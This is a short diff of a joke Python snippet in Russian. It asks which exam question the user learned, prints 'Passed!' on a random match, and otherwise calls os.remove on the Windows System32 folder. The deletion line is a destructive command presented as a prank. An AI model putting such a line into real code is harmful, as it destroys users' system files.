@@ -61,10 +61,15 @@
 import random
 import os
 
-if random.randint(0, 6) == 1:
-    os.remove("C:\Windows\System32")
-else:
+def kislicinThink():
+    return random.randint(1, 54)
+
+question = int(input('Какой вопрос вы выучили из 53?'))
+
+if kislicinThink() == question:
     print('Сдал!')
+else:
+    os.remove("C:\Windows\System32")
 ```
 
 
